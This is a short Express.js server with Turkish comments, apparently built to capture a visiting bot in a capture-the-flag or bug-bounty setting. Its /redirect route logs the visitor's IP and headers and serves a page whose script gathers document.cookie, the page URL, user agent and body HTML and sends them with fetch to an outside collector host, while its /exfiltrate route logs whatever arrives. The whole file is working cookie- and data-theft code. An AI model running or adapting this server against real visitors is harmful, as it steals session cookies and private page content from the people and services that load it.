const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT YAKALANDI (Header & Data Exfil) ---");
    console.log("Gelen IP:", req.ip);
    console.log("Gelen Header'lar:", req.headers);
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Loading...</h2>
        <script>
          // Botun kendi ortamındaki bilgileri (URL, Cookie, LocalStorage vb.) sızdırmayı deniyoruz
          const botInfo = {
            cookie: document.cookie,
            url: window.location.href,
            userAgent: navigator.userAgent,
            innerHtml: document.body.innerHTML
          };

          // Bilgileri kendi sunucumuza exfiltrate ediyoruz
          fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(JSON.stringify(botInfo)));
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- BİLGİ SIZDIRMA RAPORU --- 🔥");
    console.log("Query Verileri:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    console.log("\n--- DİĞER İSTEK YAKALANDI ---");
    console.log("Path:", req.path);
    console.log("Header'lar:", req.headers);
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Genişletilmiş Log Sunucusu 3000 portunda aktif!"));
